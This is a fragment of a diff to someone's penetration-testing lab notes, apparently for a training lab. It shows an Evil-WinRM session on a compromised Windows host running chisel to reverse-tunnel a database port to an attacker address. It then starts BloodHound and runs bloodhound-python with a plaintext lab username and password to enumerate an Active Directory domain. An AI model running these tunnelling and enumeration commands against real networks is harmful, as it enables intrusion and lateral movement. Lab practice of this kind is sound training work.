@@ -66,4 +66,17 @@ cd C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin
 *Evil-WinRM* PS C:\Users\apache.ERA\Documents> .\chisel_windows.exe client 192.168.45.214:8000 R:3306:127.0.0.1:3306
 
 
+┌──(kali㉿kali)-[~]
+└─$ sudo neo4j console
+//Open your web browser and navigate to http://localhost:7474. Log in with the default credentials (neo4j/neo4j) and change the password when prompted.
+//neo4j://localhost:7687
+
+┌──(kali㉿kali)-[~]
+└─$ bloodhound
+
+┌──(kali㉿kali)-[~/lab0/96] (install bloodhound.exe first)
+└─$ bloodhound-python -u 'charlotte' -p 'Game2On4.!' -ns 192.168.105.97 -d secura.yzx -c All --dns-timeout 15
+
+
+
 
